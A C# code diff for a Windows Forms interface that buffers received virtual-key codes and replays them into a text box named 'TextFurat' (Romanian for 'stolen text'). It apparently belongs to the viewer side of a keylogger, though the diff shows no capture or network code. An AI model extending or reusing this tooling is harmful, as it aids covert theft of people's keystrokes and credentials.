@@ -24,6 +24,8 @@ namespace UIModule
     {
         private LoggerWriter _log;
         private String TempFile;
+        private int[] BufferCaractere = new int[5000];
+        private int NumarCaractere = 0;
         public InterfataSimpla(LoggerWriter log)
         {
             var assembly = Assembly.GetExecutingAssembly();
@@ -78,6 +80,11 @@ namespace UIModule
                         break;
                     }
             }
+            TextFurat.Text = "";
+            for (int i = 0; i < NumarCaractere; i++)
+            {
+                _log.HandleVK(BufferCaractere[i], "", TextFurat);
+            }
         }
 
         private void label3_Click(object sender, EventArgs e)
@@ -97,6 +104,8 @@ namespace UIModule
                     if (code != "")
                     {
                         int vkCode = Int16.Parse(code);
+                        BufferCaractere[NumarCaractere] = vkCode;
+                        NumarCaractere++;
                         _log.HandleVK(vkCode, "", TextFurat);
                     }
                 }
@@ -125,6 +134,18 @@ namespace UIModule
         private void SocketDebug_TextChanged(object sender, EventArgs e)
         {
 
+        }
+
+        private void ButonClear_Click(object sender, EventArgs e)
+        {
+            BufferCaractere = new int[5000];
+            NumarCaractere = 0;
+            TextFurat.Text = "";
+        }
+
+        private void ModAfisare_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            e.Handled = true;
         }
     }
 }
